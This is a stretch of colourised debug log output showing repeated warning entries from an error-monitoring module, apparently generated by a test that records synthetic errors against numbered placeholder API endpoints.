WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938739Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938942Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938991Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939182Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939419Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939581Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939641Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4678'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939749Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4679'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4680'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4681'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939895Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4682'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939943Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4683'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.939993Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4684'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940043Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4685'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940093Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4686'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4687'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4688'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4689'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940288Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4690'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4691'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940385Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4692'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4693'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4694'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4695'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940667Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4696'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4697'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
